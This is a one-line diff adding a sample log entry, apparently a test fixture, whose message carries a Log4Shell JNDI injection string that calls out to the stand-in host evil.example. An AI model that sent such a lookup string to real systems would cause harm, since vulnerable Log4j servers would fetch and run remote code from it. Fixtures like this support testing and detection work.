@@ -1,0 +1,1 @@
+2021-12-10 09:00:00 INFO  [main] org.apache.logging.log4j.core.net.server.Log4jSocketServer ${jndi:ldap://evil.example/a} hello
